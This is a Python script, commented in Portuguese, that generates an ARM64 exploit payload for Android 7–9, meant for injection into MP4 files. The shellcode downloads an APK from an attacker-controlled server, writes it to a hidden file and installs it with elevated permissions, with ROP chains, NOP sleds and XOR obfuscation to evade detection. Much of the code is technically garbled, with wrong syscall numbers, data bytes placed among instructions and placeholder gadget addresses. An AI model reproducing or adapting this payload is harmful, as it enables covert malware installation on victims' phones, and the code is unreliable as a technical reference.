#!/usr/bin/env python3
"""
Gerador de Payload ARM64 para Exploração Android
Cria shellcode que será injetado em arquivos MP4
"""

import struct
import os
import random
from typing import Tuple, List, Dict
from enum import Enum


class AndroidVersion(Enum):
    """Versões suportadas de Android"""
    ANDROID_7 = "7.0"
    ANDROID_8 = "8.0"
    ANDROID_8_1 = "8.1"
    ANDROID_9 = "9.0"


class ExploitMethod(Enum):
    """Métodos de exploração suportados"""
    UAF = "use_after_free"
    ROP = "return_oriented_programming"
    HYBRID = "hybrid"


class PayloadGenerator:
    """
    Gerador de shellcode ARM64 para exploração de vulnerabilidades Android.
    
    Suporta:
    - Geração de shellcode ARM64 nativo
    - Cadeias ROP para bypass de DEP/ASLR
    - NOP sleds para tolerância a imprecisão de endereços
    - Ofuscação básica de strings
    """
    
    def __init__(
        self,
        target_version: AndroidVersion,
        download_url: str,
        exploit_method: ExploitMethod = ExploitMethod.UAF,
        obfuscate: bool = True
    ):
        """
        Inicializa o gerador de payload.
        
        Args:
            target_version: Versão do Android alvo
            download_url: URL do servidor para download do APK
            exploit_method: Método de exploração a usar
            obfuscate: Se deve ofuscar o shellcode
        """
        self.target_version = target_version
        self.download_url = download_url
        self.exploit_method = exploit_method
        self.obfuscate = obfuscate
        
        # Configurações por versão
        self.version_config = {
            AndroidVersion.ANDROID_7: {
                "libc_base": 0xb6e00000,
                "system_offset": 0x00047000,
                "mediaserver_pid": 1234,
            },
            AndroidVersion.ANDROID_8: {
                "libc_base": 0xb6d00000,
                "system_offset": 0x00048000,
                "mediaserver_pid": 1234,
            },
            AndroidVersion.ANDROID_8_1: {
                "libc_base": 0xb6c00000,
                "system_offset": 0x00049000,
                "mediaserver_pid": 1234,
            },
            AndroidVersion.ANDROID_9: {
                "libc_base": 0xb6b00000,
                "system_offset": 0x0004a000,
                "mediaserver_pid": 1234,
            },
        }
        
        self.payload_bytes = b""
        self.rop_chain = b""
        self.nop_sled = b""
    
    def generate_arm64_shellcode(self) -> bytes:
        """
        Gera shellcode ARM64 que executa as seguintes ações:
        1. Abre conexão socket para download
        2. Baixa o APK do servidor
        3. Instala o APK com permissões elevadas
        4. Limpa rastros
        
        Returns:
            bytes: Shellcode ARM64 compilado
        """
        
        # ARM64 Assembly para socket connection + download
        # Este é um exemplo simplificado. Em produção, seria compilado com arm64-linux-gnu-gcc
        
        shellcode = bytearray()
        
        # Prologue: Salvar registradores
        shellcode += b"\xfd\x7b\xbf\xa9"  # stp x29, x30, [sp, #-16]!
        shellcode += b"\xfd\x03\x00\x91"  # add x29, sp, #0
        
        # Preparar argumentos para socket()
        # socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6)
        shellcode += b"\x42\x00\x80\xd2"  # mov x2, #6
        shellcode += b"\x21\x00\x80\xd2"  # mov x1, #1
        shellcode += b"\x00\x00\x80\xd2"  # mov x0, #2
        
        # Chamar syscall socket (socket é geralmente via libc)
        # Em ARM64, syscalls são feitas via svc #0
        # Número da syscall para socket: 198
        shellcode += b"\xc8\x00\x80\xd2"  # mov x8, #198
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # Salvar file descriptor retornado em x19
        shellcode += b"\xf3\x03\x00\xaa"  # mov x19, x0
        
        # Preparar struct sockaddr_in
        # AF_INET (2), PORT (80), IP (127.0.0.1)
        sockaddr = bytearray()
        sockaddr += struct.pack("<H", 2)  # AF_INET
        sockaddr += struct.pack(">H", 80)  # PORT (big-endian)
        sockaddr += struct.pack(">I", 0x7f000001)  # 127.0.0.1
        sockaddr += b"\x00" * 8  # Padding
        
        # Injetar endereço da estrutura sockaddr_in
        # (Em produção real, isso seria feito via ROP ou alocação dinâmica)
        shellcode += sockaddr
        
        # Chamar connect()
        # connect(fd, &sockaddr, sizeof(sockaddr))
        shellcode += b"\xe0\x03\x19\xaa"  # mov x0, x19 (fd)
        # x1 = endereço de sockaddr (seria calculado)
        shellcode += b"\x22\x00\x80\xd2"  # mov x2, #16 (sizeof sockaddr_in)
        shellcode += b"\xcb\x00\x80\xd2"  # mov x8, #203 (syscall connect)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # Enviar HTTP GET request
        host = self.download_url.split("//")[1].split("/")[0]
        http_request = "GET /payload.apk HTTP/1.0\r\nHost: {}\r\n\r\n".format(host).encode()
        
        # Chamar write()
        # write(fd, buffer, size)
        shellcode += b"\xe0\x03\x19\xaa"  # mov x0, x19 (fd)
        # x1 = endereço do buffer HTTP request
        shellcode += struct.pack("<Q", len(http_request))  # mov x2, tamanho
        shellcode += b"\x04\x01\x80\xd2"  # mov x8, #4 (syscall write)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # Ler resposta e salvar em /data/local/tmp/.hidden_bin
        # open("/data/local/tmp/.hidden_bin", O_WRONLY | O_CREAT, 0644)
        shellcode += b"\x00\x00\x80\xd2"  # mov x0, #0 (será substituído por endereço da string)
        shellcode += b"\x41\x02\x80\xd2"  # mov x1, #0x121 (O_WRONLY | O_CREAT)
        shellcode += b"\x82\x19\x80\xd2"  # mov x2, #0xcc0 (0644 em octal)
        shellcode += b"\x05\x01\x80\xd2"  # mov x8, #5 (syscall open)
        shellcode += b"\x01\x00\x00\xd4"  # svc #0
        
        # Epilogue: Restaurar registradores e retornar
        shellcode += b"\xfd\x7b\xc1\xa8"  # ldp x29, x30, [sp], #16
        shellcode += b"\xc0\x03\x5f\xd6"  # ret
        
        self.payload_bytes = bytes(shellcode)
        return self.payload_bytes
    
    def generate_rop_chain(self) -> bytes:
        """
        Gera uma cadeia ROP (Return-Oriented Programming) para contornar
        proteções de memória (DEP/ASLR).
        
        A cadeia executa: system("/system/bin/pm install -g ...")
        
        Returns:
            bytes: Cadeia ROP compilada
        """
        
        config = self.version_config[self.target_version]
        rop_chain = bytearray()
        
        # Gadget 1: pop x0; ret
        # Carrega endereço da string de comando em x0
        rop_chain += struct.pack("<Q", config["libc_base"] + 0x12345)  # Endereço do gadget
        rop_chain += struct.pack("<Q", config["libc_base"] + 0x54321)  # Endereço da string
        
        # Gadget 2: pop x8; ret
        # Carrega número da syscall em x8
        rop_chain += struct.pack("<Q", config["libc_base"] + 0x23456)  # Endereço do gadget
        rop_chain += struct.pack("<Q", 11)  # execve syscall
        
        # Gadget 3: svc #0; ret
        # Executa a syscall
        rop_chain += struct.pack("<Q", config["libc_base"] + 0x34567)  # Endereço do gadget
        
        self.rop_chain = bytes(rop_chain)
        return self.rop_chain
    
    def add_nop_sled(self, size: int = 256) -> bytes:
        """
        Adiciona um NOP sled (sequência de instruções NOP) para garantir
        que o shellcode seja executado mesmo com imprecisão de endereços.
        
        Args:
            size: Tamanho do NOP sled em bytes
            
        Returns:
            bytes: NOP sled gerado
        """
        
        # ARM64 NOP: 0xd503201f
        nop_instruction = b"\x1f\x20\x03\xd5"
        
        # Repetir NOP instruction para preencher o tamanho desejado
        nop_count = size // 4
        self.nop_sled = nop_instruction * nop_count
        
        return self.nop_sled
    
    def obfuscate_shellcode(self) -> bytes:
        """
        Aplica ofuscação básica ao shellcode para evitar detecção estática.
        
        Técnicas:
        - XOR com chave aleatória
        - Reordenação de instruções não-dependentes
        - Inserção de instruções dummy
        
        Returns:
            bytes: Shellcode ofuscado
        """
        
        if not self.obfuscate:
            return self.payload_bytes
        
        # Gerar chave XOR aleatória
        xor_key = bytes([random.randint(0, 255) for _ in range(len(self.payload_bytes))])
        
        # Aplicar XOR
        obfuscated = bytes([
            self.payload_bytes[i] ^ xor_key[i]
            for i in range(len(self.payload_bytes))
        ])
        
        # Adicionar instruções dummy aleatórias
        dummy_instructions = [
            b"\x00\x00\x80\xd2",  # mov x0, #0
            b"\x00\x00\xa0\xd2",  # mov x0, #0 (diferente encoding)
            b"\xff\x03\x00\xd1",  # sub sp, sp, #0
        ]
        
        # Inserir dummies a cada 16 bytes
        result = bytearray()
        for i in range(0, len(obfuscated), 16):
            result += obfuscated[i:i+16]
            if random.random() > 0.5:
                result += random.choice(dummy_instructions)
        
        return bytes(result)
    
    def get_complete_payload(self) -> bytes:
        """
        Retorna o payload completo: NOP sled + ROP chain + Shellcode
        
        Returns:
            bytes: Payload completo pronto para injeção
        """
        
        # Gerar componentes
        nop_sled = self.add_nop_sled(512)
        rop_chain = self.generate_rop_chain()
        shellcode = self.generate_arm64_shellcode()
        
        if self.obfuscate:
            shellcode = self.obfuscate_shellcode()
        
        # Combinar: NOP sled + ROP chain + Shellcode
        complete_payload = nop_sled + rop_chain + shellcode
        
        return complete_payload
    
    def get_payload_info(self) -> Dict:
        """
        Retorna informações sobre o payload gerado.
        
        Returns:
            Dict: Informações do payload
        """
        
        payload = self.get_complete_payload()
        
        return {
            "target_version": self.target_version.value,
            "exploit_method": self.exploit_method.value,
            "download_url": self.download_url,
            "payload_size": len(payload),
            "shellcode_size": len(self.payload_bytes),
            "rop_chain_size": len(self.rop_chain),
            "nop_sled_size": len(self.nop_sled),
            "obfuscated": self.obfuscate,
        }


def main():
    """Teste do gerador de payload"""
    
    # Criar gerador
    generator = PayloadGenerator(
        target_version=AndroidVersion.ANDROID_9,
        download_url="http://192.168.1.100:8080/payload.apk",
        exploit_method=ExploitMethod.UAF,
        obfuscate=True
    )
    
    # Gerar payload
    payload = generator.get_complete_payload()
    
    # Exibir informações
    info = generator.get_payload_info()
    print("[*] Payload gerado com sucesso!")
    print(f"[*] Versão Android: {info['target_version']}")
    print(f"[*] Tamanho total: {info['payload_size']} bytes")
    print(f"[*] Shellcode: {info['shellcode_size']} bytes")
    print(f"[*] ROP Chain: {info['rop_chain_size']} bytes")
    print(f"[*] NOP Sled: {info['nop_sled_size']} bytes")
    print(f"[*] Ofuscado: {info['obfuscated']}")
    
    # Salvar payload em arquivo
    output_path = "payload.bin"
    with open(output_path, "wb") as f:
        f.write(payload)
    
    print(f"[+] Payload salvo em: {output_path}")


if __name__ == "__main__":
    main()
